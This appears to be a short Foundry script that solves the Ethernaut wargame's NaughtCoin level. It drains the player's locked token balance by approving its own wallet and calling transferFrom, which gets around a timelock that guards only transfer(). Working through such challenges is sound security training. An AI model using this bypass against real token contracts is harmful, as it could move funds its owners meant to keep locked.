// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/15_NaughtCoin.sol";

contract ExploitScript is Script {
    NaughtCoin level15 = NaughtCoin(payable(your_challenge_address));
    address wallet = your_wallet_address;

    function run() external {
        vm.startBroadcast();

        uint256 coin = level15.balanceOf(wallet);
        level15.approve(wallet, coin);
        level15.transferFrom(wallet, address(level15), coin);
        
        vm.stopBroadcast();
    }
}